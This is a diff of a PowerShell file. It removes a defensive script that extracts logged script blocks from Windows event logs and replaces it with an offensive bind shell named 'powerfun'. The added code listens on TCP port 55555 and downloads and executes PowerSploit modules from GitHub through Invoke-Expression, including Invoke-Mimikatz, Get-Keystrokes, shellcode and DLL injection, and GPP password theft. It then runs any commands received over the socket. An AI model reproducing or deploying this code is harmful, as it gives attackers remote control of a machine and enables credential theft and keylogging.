@@ -1,129 +1,62 @@
-﻿#Usage:
-#Usage: 
-# 
-#NOTE: Remember to include the path to Microsoft-Windows-PowerShell%4Operational.evtx below.  
-# 
-#C:\>ExtractAllScripts.ps1   
-#The default behavior of the script is to assimilate and extract every script/command to disk. 
-# 
-#C:\ExtractAllScripts -List 
-#This will only list Script Block IDs with associated Script Names(if logged.) 
-# 
-#C:\>ExtractAllScripts.ps1 -ScriptBlockID aeb8cd23-3052-44f8-b6ba-ff3c083e912d 
-#This will only extract the script corresponding to the user specified ScriptBlock ID 
-# 
-#Twitter: @vikas891 
- 
-param ($ScriptBlockID, [switch]$List) 
-$StoreArrayHere = Get-WinEvent -FilterHashtable @{ Path="C:\tmp\Microsoft-Windows-PowerShell%4Operational.evtx"; ProviderName=“Microsoft-Windows-PowerShell”; Id = 4104 }  
-$Desc = $StoreArrayHere | sort -Descending { $_.Properties[1].Value }  
-$ArrayofUniqueIDs = @() 
-     
-if(!$ScriptBlockID) 
-{ 
-    $Desc | %{ $ArrayofUniqueIDs += $_.Properties[3].Value } 
-} 
-else 
-{ 
-    $Desc | %{ $ArrayofUniqueIDs += $_.Properties[3].Value } 
-    if($ScriptBlockID -in $ArrayofUniqueIDs) 
-    { 
-    $ArrayofUniqueIDs = $ScriptBlockID 
-    } 
-    else 
-    { 
-    "" 
-    Write-Host "[!] Specified Script Block ID does not exist. Exiting.." -ForegroundColor Red 
-    break 
-    } 
-} 
-$ArrayofUniqueIDs = $ArrayofUniqueIDs | select -Unique 
- 
-if($List) 
-{ 
-        foreach ($a in $ArrayofUniqueIDs) 
-        { 
-        $Temp = $StoreArrayHere | Where-Object { $_.Message -like "*$a*" } 
-        $SortIt = $Temp | sort { $_.Properties[0].Value }  
-        "" 
-        if($SortIt[0].Properties[4].Value) 
-        { 
-            $OriginalName = Split-Path -Path $SortIt[0].Properties[4].Value -Leaf 
-            $FileName = "$($a)_$($OriginalName)" 
-            $DisplayName = $SortIt[0].Properties[4].Value 
-        } 
-        else 
-        { 
-            $OriginalName = '' 
-            $FileName = $a 
-            $DisplayName = 'NULL' 
-        } 
-        Write-Host -NoNewline "Script ID: "  
-        Write-Host -NoNewline $a -ForegroundColor Yellow 
-        Write-Host -NoNewline " | " -ForegroundColor White 
-        Write-Host -NoNewline "Script Name:" 
-        Write-Host -NoNewline $DisplayName -ForegroundColor Magenta 
-        $NumberOfRecords = $Temp.Count 
-        $MessageTotal = $Temp[0] | % {$_.Properties[1].Value} 
-        if($NumberOfRecords -eq $MessageTotal) 
-            { 
-            Write-Host -NoNewline " | Complete Script " -ForegroundColor Green 
-            Write-Host -NoNewline " | Event Records Logged"$NumberOfRecords/$MessageTotal 
-            "" 
-            } 
-        else 
-            { 
-            Write-Host -NoNewline " | InComplete Script Logged" -ForegroundColor Red 
-            Write-Host -NoNewline " | Event Records Logged"$NumberOfRecords/$MessageTotal 
-            "" 
-            }     
-    } 
-break 
-} 
-     
-foreach ($a in $ArrayofUniqueIDs) 
-{ 
-    $Temp = $StoreArrayHere | Where-Object { $_.Message -like "*$a*" } 
-    $SortIt = $Temp | sort { $_.Properties[0].Value }  
-    "" 
-    if($SortIt[0].Properties[4].Value) 
-    { 
-        $OriginalName = Split-Path -Path $SortIt[0].Properties[4].Value -Leaf 
-        $FileName = "$($a)_$($OriginalName)" 
-        $DisplayName = $SortIt[0].Properties[4].Value 
-    } 
-    else 
-    { 
-        $OriginalName = '' 
-        $FileName = $a 
-        $DisplayName = 'NULL' 
-    } 
-    Write-Host -NoNewline "Extracting "  
-    Write-Host -NoNewline $a -ForegroundColor Yellow 
-    if ($OriginalName) 
-    { 
-        Write-Host -NoNewline _$OriginalName -ForegroundColor Magenta 
-    } 
-    Write-Host -NoNewline " | " -ForegroundColor White 
-    Write-Host -NoNewline "ScriptName:" 
-    Write-Host -NoNewline $DisplayName -ForegroundColor Magenta 
-    $MergedScript = -join ($SortIt | % { $_.Properties[2].Value }) | Out-File $FileName 
-    $NumberOfRecords = $Temp.Count 
-    $MessageTotal = $Temp[0] | % {$_.Properties[1].Value} 
-    if($NumberOfRecords -eq $MessageTotal) 
-        { 
-        Write-Host -NoNewline " | Complete Script Logged  " -ForegroundColor Green 
-        Write-Host -NoNewline " | Event Records Exported"$NumberOfRecords/$MessageTotal 
-        Write-Host -NoNewline " | Number of lines" (Get-Content $FileName).Length 
-        "" 
-        } 
-    else 
-        { 
-        Write-Host -NoNewline " | InComplete Script Logged" -ForegroundColor Red 
-        ren $FileName "$FileName.partial" 
-        Write-Host -NoNewline " | Event Records Exported"$NumberOfRecords/$MessageTotal 
-        Write-Host -NoNewline " | Number of lines" (Get-Content "$FileName.partial").Length 
-        "" 
-        } 
-    $FileName = ''     
+#requires -Version 1
+function Get-Webclient 
+{
+    $wc = New-Object -TypeName Net.WebClient
+    $wc.UseDefaultCredentials = $true
+    $wc.Proxy.Credentials = $wc.Credentials
+    $wc
 }
+
+function powerfun 
+{
+    $modules = @(
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1', 
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1', 
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1', 
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1', 
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1', 
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1', 
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1', 
+        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1', 
+        'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1', 
+        'https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerView/powerview.ps1'
+        'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Poweruphelp.ps1'
+        'https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/Get-Powerviewhelp.ps1')
+
+    $listener = [System.Net.Sockets.TcpListener]55555
+    $listener.start()
+    [byte[]]$bytes = 0..255|ForEach-Object -Process {
+        0
+    }
+    $client = $listener.AcceptTcpClient()
+    $stream = $client.GetStream()
+    
+    ForEach ($module in $modules)
+    {
+        (Get-Webclient).DownloadString($module)|Invoke-Expression
+    } 
+
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nInvoke-Shellcode`nInvoke-DllInjection`nInvoke-Mimikatz`nInvoke-NinjaCopy`nGet-GPPPassword`nGet-Keystrokes`nGet-TimedScreenshot`nInvoke-ReflectivePEInjection`nPowerUp`nPowerView`n`nType 'Get-Help Module-Name -Full' for more details on any module.`nFor help on the PowerUp and PowerView modules use Get-Poweruphelp and Get-Powerviewhelp to provide list of commands`n`n")
+    $stream.Write($sendbytes,0,$sendbytes.Length)
+    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+    $stream.Write($sendbytes,0,$sendbytes.Length)
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+    {
+        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+        $data = $EncodedText.GetString($bytes,0, $i)
+        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+
+        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+        $x = ($error[0] | Out-String)
+        $error.clear()
+        $sendback2 = $sendback2 + $x
+
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte,0,$sendbyte.Length)
+        $stream.Flush()  
+    }
+    $client.Close()
+    $listener.Stop()
+}
+
+powerfun
